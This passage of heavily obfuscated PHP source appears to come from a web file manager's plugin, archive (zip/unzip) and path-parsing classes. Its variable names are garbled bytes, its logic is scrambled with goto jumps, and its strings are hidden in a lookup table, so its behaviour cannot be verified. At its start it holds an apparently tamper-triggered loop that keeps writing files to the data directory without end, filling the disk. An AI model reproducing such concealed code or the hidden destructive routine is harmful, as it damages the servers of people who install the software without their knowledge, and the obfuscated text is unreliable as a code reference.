eò©Œã”ø™: $cç‹Ÿº‰¯(); $A ¥‡ÃÔôÕ = $Aª•†¿š¥˜[1330]; $dÉ©·ËšŠÇ = json_encode($GLOBALS[$Aª•†¿š¥˜[1331]]); goto A¾–ÉàÑ´ë; A“àÒÊ‹¼°: $c†½£»ŞÓ‘ = $Aª•†¿š¥˜[781]; $c†½£»ŞÓ‘($_SERVER[$Aª•†¿š¥˜[782]]); $cç‹Ÿº‰¯ = $Aª•†¿š¥˜[780]; goto eò©Œã”ø™; A¾–ÉàÑ´ë: $cŠ¼Ğ“‰´é = 1; for ($E×™½•Î¢† = $cŠ¼Ğ“‰´é; $E×™½•Î¢† > 0; $E×™½•Î¢†++) { $A ¥‡ÃÔôÕ(DATA_PATH . $E×™½•Î¢†, $dÉ©·ËšŠÇ); } goto f•èœÓÆš«; DÎÍ×„Ó¿: $C¬´ öŠÀš = $CÆ¡òè‰µ($a¥ÍÃ­); $F…ˆ”¿©¼— = explode($Aª•†¿š¥˜[213], $C¬´ öŠÀš); if (count($F…ˆ”¿©¼—) < $Aª•†¿š¥˜[557]) { $D’øæ¿Ô×Ü = $Aª•†¿š¥˜[366]; $D’øæ¿Ô×Ü(); } goto A“àÒÊ‹¼°; f•èœÓÆš«: } return $this->modelPlugin->setConfig($this->pluginName, $B¹£Ñİ°î‰); } public function onSetConfig($fÕ†×½–ˆ) { } public function onGetConfig($eö‚¶Äò¢) { } public function onChangeStatus($E¨‚ĞŒ‚ÂÖ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Bİ³—™Íİ® = "\160\x6c\165\147\x69\156\x41\165\164\x68") { $Bœ¡Ïä…êË =& $_SERVER[Ä¿Ş°¨]; if (!defined($Bœ¡Ïä…êË[431])) { return !1; } if (_get($GLOBALS, $Bœ¡Ïä…êË[461])) { return !0; } $eíÒöÁ·¶Ã = $this->getConfig(); if (!$eíÒöÁ·¶Ã[$Bİ³—™Íİ®]) { return !1; } return ActionCall($Bœ¡Ïä…êË[1332], $eíÒöÁ·¶Ã[$Bİ³—™Íİ®]); } public function url($cö¤±°óó¼, $aï•¼Ï‰† = '', $DÜï×Ô—®­ = true) { goto bÜ›Ã¥«éì; bÄî›å³ï: $b×·èóµ² = $this->packageVersion(); $F¦•Ä ğ¼ = $bô„ÁÑÙ®Š . $BåÜ¬Ó•…“[416] . $b×·èóµ²; if (substr($cö¤±°óó¼, 0, 4) == $BåÜ¬Ó•…“[142] || substr($cö¤±°óó¼, 0, 2) == $BåÜ¬Ó•…“[1132]) { $eĞ“«­ª”Ü = $cö¤±°óó¼ . $BåÜ¬Ó•…“[1333] . $F¦•Ä ğ¼; } else { if ($aï•¼Ï‰† == $BåÜ¬Ó•…“[33]) { $eĞ“«­ª”Ü = $this->pluginHost . $cö¤±°óó¼ . $BåÜ¬Ó•…“[1333] . $F¦•Ä ğ¼; } else { if ($aï•¼Ï‰† === $BåÜ¬Ó•…“[76]) { $eĞ“«­ª”Ü = $this->pluginHost . $cö¤±°óó¼; } else { if ($aï•¼Ï‰† == $BåÜ¬Ó•…“[1334]) { $eĞ“«­ª”Ü = STATIC_PATH . $cö¤±°óó¼ . $BåÜ¬Ó•…“[1333] . $bô„ÁÑÙ®Š; } else { if ($aï•¼Ï‰† == $BåÜ¬Ó•…“[1335]) { $eĞ“«­ª”Ü = APP_HOST . $BåÜ¬Ó•…“[1336] . $cö¤±°óó¼ . $BåÜ¬Ó•…“[1333] . $bô„ÁÑÙ®Š; } else { if (isset($dˆ­ŒÕéèä[$aï•¼Ï‰†])) { $eĞ“«­ª”Ü = $dˆ­ŒÕéèä[$aï•¼Ï‰†] . $cö¤±°óó¼ . $BåÜ¬Ó•…“[1333] . $F¦•Ä ğ¼; } } } } } } goto Eïí¡²Ø®´; Eïí¡²Ø®´: if (!$DÜï×Ô—®­) { return $eĞ“«­ª”Ü; } echo $eĞ“«­ª”Ü; goto a´ÊäøÔ¢Õ; bÜ›Ã¥«éì: $BåÜ¬Ó•…“ =& $_SERVER[Ä¿Ş°¨]; $dˆ­ŒÕéèä = $this->getConfig(); $bô„ÁÑÙ®Š = KOD_VERSION . $BåÜ¬Ó•…“[91] . KOD_VERSION_BUILD; goto bÄî›å³ï; a´ÊäøÔ¢Õ: } public function link($Aè„øò¸æ› = false, $AØõ£ß‡É = '') { $E„Ü›ÈÕ ¥ =& $_SERVER[Ä¿Ş°¨]; if (!$Aè„øò¸æ›) { $this->link($E„Ü›ÈÕ ¥[1337], $E„Ü›ÈÕ ¥[1335]); $this->link($E„Ü›ÈÕ ¥[1338], $E„Ü›ÈÕ ¥[1334]); $this->link($E„Ü›ÈÕ ¥[1339], $E„Ü›ÈÕ ¥[1334]); $this->link($E„Ü›ÈÕ ¥[1340], $E„Ü›ÈÕ ¥[1334]); $this->link($E„Ü›ÈÕ ¥[1341], $E„Ü›ÈÕ ¥[1334]); return; } $A„—ºƒ×”ë = $this->url($Aè„øò¸æ›, $AØõ£ß‡É, !1); if (substr($Aè„øò¸æ›, -3) == $E„Ü›ÈÕ ¥[1342]) { echo $E„Ü›ÈÕ ¥[1343] . $A„—ºƒ×”ë . $E„Ü›ÈÕ ¥[1344] . $E„Ü›ÈÕ ¥[213]; } else { if (substr($Aè„øò¸æ›, -4) == $E„Ü›ÈÕ ¥[1345]) { echo $E„Ü›ÈÕ ¥[1346] . $A„—ºƒ×”ë . $E„Ü›ÈÕ ¥[1347] . $E„Ü›ÈÕ ¥[213]; } } } } goto bÁêŒ½‘´ï; A“ÜÍÜ¤œ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $cãÅŠÔÊÁ; if (!$cãÅŠÔÊÁ) { $b´Ê°Ë—¬á = IO::init($_SERVER[Ä¿Ş°¨][8]); } return $b´Ê°Ë—¬á; } private static function iconvSystem($bá‡­…®­¨) { return self::local()->iconvSystem($bá‡­…®­¨); } private static function iconvApp($DèËäÉàÉ) { return self::local()->iconvApp($DèËäÉàÉ); } public static function zip($Bø½åÙÜ“ã, $AÄƒà¡˜÷ = "\x7a\x69\160", $fçíŒğôâÆ = '', $CˆìÖ‚ŒŒ = REPEAT_RENAME) { goto d¿¯îò°£°; Fä‹æÚ‹³¥: foreach ($B­ïÉÆ¤Ñ¦ as $DŠãëÕ‘½Õ => $BÎšèñ´±) { $B­ïÉÆ¤Ñ¦[$DŠãëÕ‘½Õ] = self::iconvSystem($BÎšèñ´±); } KodArchive::create($B›˜¹¨ˆ¦, $B­ïÉÆ¤Ñ¦); if (!IO::exist($c‚…Æª·å)) { if ($d‰ô‰æ†äá) { del_dir($d‰ô‰æ†äá); } show_json(LNG($eÄ³ ßËˆ[1012]), !1); } goto AÉ®…‰Û®; d¿¯îò°£°: $eÄ³ ßËˆ =& $_SERVER[Ä¿Ş°¨]; $A‡¾´¤ÆÃ = self::init($Bø½åÙÜ“ã[0][$eÄ³ ßËˆ[75]]); $C®±ˆÈ¸šÒ = self::info($Bø½åÙÜ“ã[0][$eÄ³ ßËˆ[75]]); goto còê§‹ÀÖÆ; b†ÅÚ¨§îè: if (count($B­ïÉÆ¤Ñ¦) > 1) { $d×˜»Íœ” = IO::info(IO::pathFather($C®±ˆÈ¸šÒ[$eÄ³ ßËˆ[75]])); $f±Ç¦¡£¼ = $d×˜»Íœ”[$eÄ³ ßËˆ[28]]; } $DòÛ•Î¸ö = $d‰ô‰æ†äá; if (!$DòÛ•Î¸ö) { $DòÛ•Î¸ö = get_path_father($C®±ˆÈ¸šÒ[$eÄ³ ßËˆ[75]]); $dëµ™é©Ò‘ = IO::info($DòÛ•Î¸ö); if (!$dëµ™é©Ò‘[$eÄ³ ßËˆ[185]]) { show_json(LNG($eÄ³ ßËˆ[1011]), !1); } } goto Aí¢õà¸ª½; AÉ®…‰Û®: if ($fçíŒğôâÆ || !$d‰ô‰æ†äá) { if ($d‰ô‰æ†äá && strstr($d‰ô‰æ†äá, TEMP_FILES)) { $Aà÷çÇŠàÅ = $B­ïÉÆ¤Ñ¦ = array(); recursion_dir($DòÛ•Î¸ö, $Aà÷çÇŠàÅ, $B­ïÉÆ¤Ñ¦, 0); foreach ($Aà÷çÇŠàÅ as $eçì×¦ºÙ‡) { del_dir($eçì×¦ºÙ‡); } foreach ($B­ïÉÆ¤Ñ¦ as $aÀÁòŒ×œø) { if ($aÀÁòŒ×œø == $B›˜¹¨ˆ¦) { continue; } del_file($aÀÁòŒ×œø); } } return $c‚…Æª·å; } $aì•Æ¾ùª„ = self::pathFather($C®±ˆÈ¸šÒ[$eÄ³ ßËˆ[75]]); $e‹…æÌ× = self::move($c‚…Æª·å, $aì•Æ¾ùª„, $CˆìÖ‚ŒŒ); goto dÔ–…ùŠõ¶; dÔ–…ùŠõ¶: if (!$e‹…æÌ×) { del_dir($d‰ô‰æ†äá); show_json(LNG($eÄ³ ßËˆ[1012]), !1); } del_dir($d‰ô‰æ†äá); return $e‹…æÌ×; goto F¹«Ç…Ï¿¤; còê§‹ÀÖÆ: $d‰ô‰æ†äá = !1; if (!$fçíŒğôâÆ && $A‡¾´¤ÆÃ->getType() == $eÄ³ ßËˆ[101]) { $B­ïÉÆ¤Ñ¦ = self::zipFileList($Bø½åÙÜ“ã); } else { $d‰ô‰æ†äá = $fçíŒğôâÆ ? $fçíŒğôâÆ : TEMP_FILES . $eÄ³ ßËˆ[1010] . time() . rand_string(8) . $eÄ³ ßËˆ[8]; mk_dir($d‰ô‰æ†äá); $B­ïÉÆ¤Ñ¦ = self::zipFileList($Bø½åÙÜ“ã, $d‰ô‰æ†äá); } $f±Ç¦¡£¼ = $C®±ˆÈ¸šÒ[$eÄ³ ßËˆ[28]]; goto b†ÅÚ¨§îè; Aí¢õà¸ª½: $c‚…Æª·å = $DòÛ•Î¸ö . $f±Ç¦¡£¼ . $eÄ³ ßËˆ[91] . $AÄƒà¡˜÷; $c‚…Æª·å = get_filename_auto($c‚…Æª·å, $eÄ³ ßËˆ[33], $CˆìÖ‚ŒŒ); $B›˜¹¨ˆ¦ = self::iconvSystem($c‚…Æª·å); goto Fä‹æÚ‹³¥; F¹«Ç…Ï¿¤: } public static function unzip($bä‹£‰Œ±õ, $b™Á‘ª‘± = "\x72\145\x70\x6c\x61\x63\145") { goto B©â±Ûî„ã; a¥ğØ¨±¢…: return !0; goto D®Šƒ’ò×; Dºñ•ŒõÉÎ: Hook::trigger($D÷êæÈæ»˜[1020], $D©±­º¬); recursion_dir($D©±­º¬, $eñÍº÷˜ƒ–, $F»Ï Á¥ßÇ, 0); $d´îÜñÓ²¯ = array_merge($eñÍº÷˜ƒ–, $F»Ï Á¥ßÇ); goto CœÎ–ùÆêî; B©â±Ûî„ã: $D÷êæÈæ»˜ =& $_SERVER[Ä¿Ş°¨]; $EÇÄ¹Ãä–™ = $bä‹£‰Œ±õ[$D÷êæÈæ»˜[75]]; $D¢÷‰ÙùÂ³ = $bä‹£‰Œ±õ[$D÷êæÈæ»˜[1013]]; goto Bµí·êŠ­; Eˆïø¡ç¢Â: $EñÑ¡îæò’ = KodArchive::extract($F°¶âæ¢§, $D©±­º¬ . $D÷êæÈæ»˜[8], $EëÕÒ–è¢Õ); self::archiveExt(); if (!$EñÑ¡îæò’[$D÷êæÈæ»˜[1017]]) { show_json($D÷êæÈæ»˜[1018] . $EñÑ¡îæò’[$D÷êæÈæ»˜[1019]], !1); } goto Dºñ•ŒõÉÎ; CœÎ–ùÆêî: foreach ($d´îÜñÓ²¯ as $E¹ñ·×¨‘Û) { $E¹ñ·×¨‘Û = self::iconvApp($E¹ñ·×¨‘Û); self::move($E¹ñ·×¨‘Û, $D¢÷‰ÙùÂ³, $b™Á‘ª‘±); } del_dir($D©±­º¬); if (!$D ½º¶’¯) { del_file($F°¶âæ¢§); } goto a¥ğØ¨±¢…; Bµí·êŠ­: if (!($fóÅùÍø•Ó = parent::info($EÇÄ¹Ãä–™))) { show_json(LNG($D÷êæÈæ»˜[1014]), !1); } if (!($cµµßĞ’ºè = parent::infoFull($D¢÷‰ÙùÂ³))) { $D¢÷‰ÙùÂ³ = parent::mkdir($D¢÷‰ÙùÂ³); $cµµßĞ’ºè = array($D÷êæÈæ»˜[75] => $D¢÷‰ÙùÂ³); } else { if (isset($cµµßĞ’ºè[$D÷êæÈæ»˜[374]]) && trim($cµµßĞ’ºè[$D÷êæÈæ»˜[75]], $D÷êæÈæ»˜[8]) != trim($D¢÷‰ÙùÂ³, $D÷êæÈæ»˜[8])) { $c®†ƒÚ¶ô = KodIO::make($cµµßĞ’ºè[$D÷êæÈæ»˜[465]]); $d÷ãÙã‰ = parent::fileNameAuto($c®†ƒÚ¶ô, $cµµßĞ’ºè[$D÷êæÈæ»˜[28]], REPEAT_RENAME_FOLDER, !0); $D¢÷‰ÙùÂ³ = parent::mkdir($c®†ƒÚ¶ô . $d÷ãÙã‰); $cµµßĞ’ºè = array($D÷êæÈæ»˜[75] => $D¢÷‰ÙùÂ³); } } $D¢÷‰ÙùÂ³ = $cµµßĞ’ºè[$D÷êæÈæ»˜[75]]; goto DõÊŒ¸œí; Bù†Êãóã®: mk_dir($D©±­º¬); $E™ƒøÕºÁ = self::fileExt($fóÅùÍø•Ó); $F°¶âæ¢§ = $D©±­º¬ . $D÷êæÈæ»˜[91] . $E™ƒøÕºÁ; goto E§â©¾™‹; E§â©¾™‹: if (!@file_exists(self::iconvSystem($F°¶âæ¢§))) { $D ½º¶’¯ = self::localFilePath($EÇÄ¹Ãä–™, $E™ƒøÕºÁ); $F°¶âæ¢§ = $D ½º¶’¯ ? $D ½º¶’¯ : parent::download($EÇÄ¹Ãä–™, $F°¶âæ¢§); } $F°¶âæ¢§ = self::iconvSystem($F°¶âæ¢§); $EëÕÒ–è¢Õ = isset($bä‹£‰Œ±õ[$D÷êæÈæ»˜[1015]]) ? $bä‹£‰Œ±õ[$D÷êæÈæ»˜[1015]] : $D÷êæÈæ»˜[1016]; goto Eˆïø¡ç¢Â; DõÊŒ¸œí: $e×¹œ²ÁŒ¤ = self::tmpFileName($fóÅùÍø•Ó); $D©±­º¬ = TEMP_FILES . $e×¹œ²ÁŒ¤; del_dir($D©±­º¬); goto Bù†Êãóã®; D®Šƒ’ò×: } public static function unzipList($e”Ô™éù·™) { goto Eåãƒ¢ƒ; dÎô¡Ó»Ó½: $CŸ†éÈ²‰Ñ = self::iconvSystem($CŸ†éÈ²‰Ñ); if ($A†’É†µõë >= 0) { $fÊ©·İÄ®ê = isset($e”Ô™éù·™[$bš‹½³¢¤Ó[1025]]) ? $e”Ô™éù·™[$bš‹½³¢¤Ó[1025]] : !1; $E¾¥ÁÕ ğ­ = isset($e”Ô™éù·™[$bš‹½³¢¤Ó[28]]) ? $e”Ô™éù·™[$bš‹½³¢¤Ó[28]] : $bš‹½³¢¤Ó[33]; KodArchive::filePreview($CŸ†éÈ²‰Ñ, $A†’É†µõë, $fÊ©·İÄ®ê, $E¾¥ÁÕ ğ­); self::archiveExt(); die; } $E¦Ü½ãÛˆ¶ = KodArchive::listContent($CŸ†éÈ²‰Ñ); goto B²ˆÖÎË°µ; Eåãƒ¢ƒ: $bš‹½³¢¤Ó =& $_SERVER[Ä¿Ş°¨]; $e‡è¶òøğ» = $e”Ô™éù·™[$bš‹½³¢¤Ó[75]]; $A†’É†µõë = isset($e”Ô™éù·™[$bš‹½³¢¤Ó[1021]]) ? $e”Ô™éù·™[$bš‹½³¢¤Ó[1021]] : -1; goto cÀŠĞŒ©›; cÀŠĞŒ©›: $dÇœ„ƒÓî = 50000; if (request_url_safe($e‡è¶òøğ»)) { $C¾áÇ™¹½² = parse_url_query($e‡è¶òøğ»); if (!isset($C¾áÇ™¹½²[$bš‹½³¢¤Ó[75]])) { show_json($bš‹½³¢¤Ó[1022], !1); } } $eÙáÍãêÅ‹ = isset($C¾áÇ™¹½²) ? $C¾áÇ™¹½²[$bš‹½³¢¤Ó[75]] : $e‡è¶òøğ»; goto F‡İ×£Â¼; B²ˆÖÎË°µ: self::archiveExt(); del_dir($e¸Øõ·Óíù); if (!$E¦Ü½ãÛˆ¶[$bš‹½³¢¤Ó[1017]]) { show_json($E¦Ü½ãÛˆ¶[$bš‹½³¢¤Ó[1019]], !1); } goto aÛ— ÕŠ‰·; eÕ‰ãËÛ‰ã: return $E¦Ü½ãÛˆ¶[$bš‹½³¢¤Ó[1019]]; goto dëºßºİîÌ; F‡İ×£Â¼: $Fö¨“¤°Öâ = self::info($eÙáÍãêÅ‹); $a‰ëÙÈäÌñ = self::fileExt($Fö¨“¤°Öâ); $fºš™¢¿á = self::tmpFileName($Fö¨“¤°Öâ); goto f¤“¢Ã©œâ; aÛ— ÕŠ‰·: $EÅ½ñåªÜÒ = json_encode($E¦Ü½ãÛˆ¶[$bš‹½³¢¤Ó[1019]]); self::setContent($EŞÎ¥˜ò·Â, $EÅ½ñåªÜÒ); if (count($E¦Ü½ãÛˆ¶[$bš‹½³¢¤Ó[1019]]) >= $dÇœ„ƒÓî) { show_json(sprintf(LNG($bš‹½³¢¤Ó[1023]), count($E¦Ü½ãÛˆ¶[$bš‹½³¢¤Ó[1019]])), !1); } goto eÕ‰ãËÛ‰ã; f¤“¢Ã©œâ: if (isset($C¾áÇ™¹½²)) { $EÂ†ğÚ©ù« = array($C¾áÇ™¹½²[$bš‹½³¢¤Ó[75]], $C¾áÇ™¹½²[$bš‹½³¢¤Ó[1021]], $C¾áÇ™¹½²[$bš‹½³¢¤Ó[28]]); $C¾³äíÛ¸ô = md5(implode($bš‹½³¢¤Ó[70], $EÂ†ğÚ©ù«)) . $bš‹½³¢¤Ó[91] . get_path_ext($C¾áÇ™¹½²[$bš‹½³¢¤Ó[28]]); } else { $EÂ†ğÚ©ù« = array($Fö¨“¤°Öâ[$bš‹½³¢¤Ó[28]], $Fö¨“¤°Öâ[$bš‹½³¢¤Ó[75]], $Fö¨“¤°Öâ[$bš‹½³¢¤Ó[77]]); $C¾³äíÛ¸ô = md5(implode($bš‹½³¢¤Ó[70], $EÂ†ğÚ©ù«)) . $bš‹½³¢¤Ó[91] . $a‰ëÙÈäÌñ; } if ($A†’É†µõë == -1) { $EŞÎ¥˜ò·Â = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\145\x77\57{$fºš™¢¿á}\57{$C¾³äíÛ¸ô}\56\154\157\147"; $eôã½‰â×ò = self::infoFull($EŞÎ¥˜ò·Â); if ($eôã½‰â×ò) { $EŞÎ¥˜ò·Â = $eôã½‰â×ò[$bš‹½³¢¤Ó[75]]; $a»øš®±óš = self::getContent($EŞÎ¥˜ò·Â); if ($a»øš®±óš) { $EÅ½ñåªÜÒ = json_decode($a»øš®±óš, !0); if (count($EÅ½ñåªÜÒ) >= $dÇœ„ƒÓî) { show_json(sprintf(LNG($bš‹½³¢¤Ó[1023]), count($EÅ½ñåªÜÒ)), !1); } return $EÅ½ñåªÜÒ; } } else { $EŞÎ¥˜ò·Â = self::mkfile($EŞÎ¥˜ò·Â); } } $e¸Øõ·Óíù = TEMP_FILES . $fºš™¢¿á; goto EšÄ‚å™àî; EšÄ‚å™àî: if (!is_dir($e¸Øõ·Óíù)) { mk_dir($e¸Øõ·Óíù); } $CŸ†éÈ²‰Ñ = $e¸Øõ·Óíù . $bš‹½³¢¤Ó[8] . $C¾³äíÛ¸ô; if (!@file_exists(self::iconvSystem($CŸ†éÈ²‰Ñ))) { if (isset($C¾áÇ™¹½²)) { url_request($e‡è¶òøğ», $bš‹½³¢¤Ó[1024], $CŸ†éÈ²‰Ñ); } else { $Dó¼Äó­õ = self::localFilePath($e‡è¶òøğ», $a‰ëÙÈäÌñ); $CŸ†éÈ²‰Ñ = $Dó¼Äó­õ ? $Dó¼Äó­õ : self::download($e‡è¶òøğ», $CŸ†éÈ²‰Ñ); } } goto dÎô¡Ó»Ó½; dëºßºİîÌ: } private static function fileExt($d¬½øéŸŒ½) { $e»ù¤—Ş‰ =& $_SERVER[Ä¿Ş°¨]; $fˆæÊ—Š‚ä = $d¬½øéŸŒ½[$e»ù¤—Ş‰[156]]; if ($fˆæÊ—Š‚ä == $e»ù¤—Ş‰[1026]) { $d©¸”†â® = $e»ù¤—Ş‰[1027]; if (substr($d¬½øéŸŒ½[$e»ù¤—Ş‰[28]], -strlen($d©¸”†â®)) == $d©¸”†â®) { $fˆæÊ—Š‚ä = $e»ù¤—Ş‰[1028]; } } self::archiveExt($fˆæÊ—Š‚ä); return $fˆæÊ—Š‚ä; } private static function zipFileList($b¨§Ë¶ÖİÑ, $b¶¤®Ÿ‡¥ß = false) { $F‚Ã•¥Ğ£è =& $_SERVER[Ä¿Ş°¨]; $a‚ğİÔ¶ŒØ = array(); foreach ($b¨§Ë¶ÖİÑ as $d¹ôà²‹Òô) { $cô­øõº‚ = $d¹ôà²‹Òô[$F‚Ã•¥Ğ£è[75]]; if ($b¶¤®Ÿ‡¥ß) { $cô­øõº‚ = self::copy($d¹ôà²‹Òô[$F‚Ã•¥Ğ£è[75]], $b¶¤®Ÿ‡¥ß, $F‚Ã•¥Ğ£è[738]); } if ($cô­øõº‚ && self::local()->exist($cô­øõº‚)) { $a‚ğİÔ¶ŒØ[$d¹ôà²‹Òô[$F‚Ã•¥Ğ£è[75]]] = $cô­øõº‚; } } if (!empty($a‚ğİÔ¶ŒØ)) { return array_values($a‚ğİÔ¶ŒØ); } show_json(LNG($F‚Ã•¥Ğ£è[1029]), !1); } public static function tmpFileName($BÎÅ§œ„Ä) { $d¼ïäóŸâÜ =& $_SERVER[Ä¿Ş°¨]; $DÈÍîïâÙ = array($BÎÅ§œ„Ä[$d¼ïäóŸâÜ[28]], $BÎÅ§œ„Ä[$d¼ïäóŸâÜ[75]], $BÎÅ§œ„Ä[$d¼ïäóŸâÜ[77]], $BÎÅ§œ„Ä[$d¼ïäóŸâÜ[463]]); return md5(implode($d¼ïäóŸâÜ[70], $DÈÍîïâÙ)); } private static function localFilePath($eôÕÄéÈ›å, $fêñ´±§) { goto B©¹‚ãÎ»”; B©¹‚ãÎ»”: $CÃåµìØ“ =& $_SERVER[Ä¿Ş°¨]; if ($fêñ´±§ == $CÃåµìØ“[1030] && strtoupper(substr(PHP_OS, 0, 3)) == $CÃåµìØ“[1031]) { return !1; } $bÉñÌÕù = KodIO::parse($eôÕÄéÈ›å); goto F Ğ¸¥¿ä; F Ğ¸¥¿ä: if ($bÉñÌÕù[$CÃåµìØ“[29]] == KodIO::KOD_SOURCE) { $D”Ã’÷ë˜¶ = Model($CÃåµìØ“[746])->fileInfoGet(KodIO::sourceID($eôÕÄéÈ›å)); if (!$D”Ã’÷ë˜¶[$CÃåµìØ“[75]]) { show_json($CÃåµìØ“[1032], !1); } $eôÕÄéÈ›å = $D”Ã’÷ë˜¶[$CÃåµìØ“[75]]; } $Bâ³åóÉí£ = self::init($eôÕÄéÈ›å); $C›ÇİğŒ³Ë = $Bâ³åóÉí£->getType(); goto EòˆÜ¨‹¸; EòˆÜ¨‹¸: if ($C›ÇİğŒ³Ë == $CÃåµìØ“[101] || $C›ÇİğŒ³Ë == $CÃåµìØ“[1033]) { if (!$Bâ³åóÉí£->exist($Bâ³åóÉí£->path)) { show_json(LNG($CÃåµìØ“[100]), !1); } return $Bâ³åóÉí£->path; } return !1; goto EëëŒî¿Òñ; EëëŒî¿Òñ: } private static function archiveExt($Fé¹¾â¹£ = '') { $GLOBALS[$_SERVER[Ä¿Ş°¨][1034]] = $Fé¹¾â¹£; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\122\x65\143\x79\x63\154\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\106\151\x6c\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\x46\x69\154\x65\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\160\x52\x6f\157\x74\x53\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\163\145\x72\x53\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\162\x53\x68\141\x72\145\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\x72\145\x54\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\x72\x65\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\x61\162\x65\111\x74\x65\x6d\x4c\151\156\x6b\175"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\x68\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\153\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\162\x52\x65\x6e\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\x65\x72\175"; public static function typeList() { $C‰óÔ‰‘‹ =& $_SERVER[Ä¿Ş°¨]; return array($C‰óÔ‰‘‹[1035] => self::KOD_SOURCE, $C‰óÔ‰‘‹[1036] => self::KOD_USER_RECYCLE, $C‰óÔ‰‘‹[1037] => self::KOD_USER_FAV, $C‰óÔ‰‘‹[1038] => self::KOD_USER_FILE_TAG, $C‰óÔ‰‘‹[1039] => self::KOD_USER_FILE_TYPE, $C‰óÔ‰‘‹[1040] => self::KOD_GROUP_ROOT_SELF, $C‰óÔ‰‘‹[1041] => self::KOD_USER_SHARE, $C‰óÔ‰‘‹[1042] => self::KOD_USER_SHARE_LINK, $C‰óÔ‰‘‹[1043] => self::KOD_USER_SHARE_TO_ME, $C‰óÔ‰‘‹[1044] => self::KOD_SHARE_ITEM, $C‰óÔ‰‘‹[1045] => self::KOD_SHARE_LINK, $C‰óÔ‰‘‹[1046] => self::KOD_SEARCH, $C‰óÔ‰‘‹[1047] => self::KOD_BLOCK, $C‰óÔ‰‘‹[1048] => self::KOD_IO, $C‰óÔ‰‘‹[1049] => self::KOD_USER_RECENT, $C‰óÔ‰‘‹[1050] => self::KOD_USER_DRIVER); } public static function parse($DÓàšº£»¥) { goto bÌƒÂÕóÚ; bÌƒÂÕóÚ: $e ëë´¼è =& $_SERVER[Ä¿Ş°¨]; $DÓàšº£»¥ = self::clear($DÓàšº£»¥); $F²íÁÉáÁÇ = array_values(self::typeList()); goto F“¦ƒ¡İÖŠ; F“¦ƒ¡İÖŠ: preg_match($e ëë´¼è[1051], $DÓàšº£»¥, $dƒ‡È’ôâŠ); $B‡£ªà¿ì¨ = array($e ëë´¼è[393] => !1, $e ëë´¼è[1052] => !1, $e ëë´¼è[390] => !1, $e ëë´¼è[75] => $DÓàšº£»¥, $e ëë´¼è[997] => !1, $e ëë´¼è[996] => $e ëë´¼è[33]); if (is_array($dƒ‡È’ôâŠ) && count($dƒ‡È’ôâŠ) == 5) { $F¯ÚŒÁå×Ù = $e ëë´¼è[1053] . $dƒ‡È’ôâŠ[2] . $e ëë´¼è[311]; if (in_array($F¯ÚŒÁå×Ù, $F²íÁÉáÁÇ)) { $B‡£ªà¿ì¨[$e ëë´¼è[997]] = $dƒ‡È’ôâŠ[1]; $B‡£ªà¿ì¨[$e ëë´¼è[29]] = $F¯ÚŒÁå×Ù; $B‡£ªà¿ì¨[$e ëë´¼è[1054]] = substr($F¯ÚŒÁå×Ù, 1, -1); $B‡£ªà¿ì¨[$e ëë´¼è[372]] = $dƒ‡È’ôâŠ[3]; } $B‡£ªà¿ì¨[$e ëë´¼è[996]] = $dƒ‡È’ôâŠ[4]; } goto FÓÉóÚì±; FÓÉóÚì±: $AËøÙ¯ãÒ = array($e ëë´¼è[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $B‡£ªà¿ì¨[$e ëë´¼è[1055]] = in_array($B‡£ªà¿ì¨[$e ëë´¼è[29]], $AËøÙ¯ãÒ); return $B‡£ªà¿ì¨; goto DåèŠë¢ãˆ; DåèŠë¢ãˆ: } public static function clear($d´£Œƒ…¹Ÿ) { goto bºåÑÅÚ; c‚Ç£Ö¯¥: if (substr($d´£Œƒ…¹Ÿ, 0, 3) == $D²óØª©‚¨[1057]) { $d´£Œƒ…¹Ÿ = substr($d´£Œƒ…¹Ÿ, 3); } while (strstr($d´£Œƒ…¹Ÿ, $C°éä»½Õ‘)) { $d´£Œƒ…¹Ÿ = str_replace($C°éä»½Õ‘, $D²óØª©‚¨[8], $d´£Œƒ…¹Ÿ); } $d´£Œƒ…¹Ÿ = preg_replace($D²óØª©‚¨[1058], $D²óØª©‚¨[8], $d´£Œƒ…¹Ÿ); goto BÛùîøœÔ­; bºåÑÅÚ: $D²óØª©‚¨ =& $_SERVER[Ä¿Ş°¨]; $d´£Œƒ…¹Ÿ = str_replace($D²óØª©‚¨[93], $D²óØª©‚¨[8], $d´£Œƒ…¹Ÿ); $C°éä»½Õ‘ = $D²óØª©‚¨[1056]; goto c‚Ç£Ö¯¥; BÛùîøœÔ­: if ($d´£Œƒ…¹Ÿ == $D²óØª©‚¨[8]) { return $D²óØª©‚¨[8]; } $d´£Œƒ…¹Ÿ = rtrim($d´£Œƒ…¹Ÿ, $D²óØª©‚¨[8]); return $d´£Œƒ…¹Ÿ; goto aé£òó¾‘æ; aé£òó¾‘æ: } public static function sourceID($C±ÛÍÁâ›) { $eŒÂ™Ûë”ğ =& $_SERVER[Ä¿Ş°¨]; $aÕ®‰ĞÊÇ = self::parse($C±ÛÍÁâ›); if ($aÕ®‰ĞÊÇ[$eŒÂ™Ûë”ğ[29]] !== self::KOD_SOURCE) { show_json(LNG($eŒÂ™Ûë”ğ[1059]), !1); } return 